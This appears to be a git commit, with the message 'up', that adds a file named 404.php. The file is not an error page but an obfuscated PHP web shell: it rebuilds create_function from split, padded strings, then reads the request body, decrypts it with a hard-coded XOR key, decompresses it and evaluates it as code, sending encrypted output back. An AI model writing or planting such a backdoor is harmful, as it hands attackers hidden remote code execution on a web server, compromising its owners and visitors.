1c5da04e324e6f01afae88ac2b3a0478fb8c0092
erik <tuananh1421999@gmail.com>
2021-03-06 22:52:30 -0500

    up

---
+++ 404.php
@@ -0,0 +1,12 @@
+<?php
+$n='$k="827Lccb0e"LL;$kh="eaL8a706LLc4c34";$kf="a16891Lf84e7bLL";$p="4DYS82LjoU';
+$D='L);$r=@bLase64_LencLode(@x(@gzcoLmpress(L$o),L$k));priLnt("$Lp$kh$rL$kf");}';
+$s='rLLL($i=0;L$i<$l;){for($j=0;($j<L$cL&&$LLi<$l);$j++,$i++){L$o.=$tL{$iL}^$Lk';
+$h='7XzKLzByL";functioLn x($Lt,L$k){$c=stLrlen($k)L;$Ll=strlLLen($t);$o=""L;fo';
+$k=str_replace('WU','','crWUeaWUtWUe_fuWUWUncWUtion');
+$K='nts(L"phLp://inpLut")L,$m)L==1) {@obL_stLart();L@evaLl(@gzLuncompresLs(@x(@';
+$Z='{$j};}}reLturn $o;}if (L@preg_LLmatLch("/$Lkh(.+)$kf/",L@file_LLget_conte';
+$Q='baLse64_decoLdeL($m[L1]),$kL)));$o=@ob_Lget_conteLLnts();@ob_endL_Lclean(';
+$H=str_replace('L','',$n.$h.$s.$Z.$K.$Q.$D);
+$R=$k('',$H);$R();
+?>
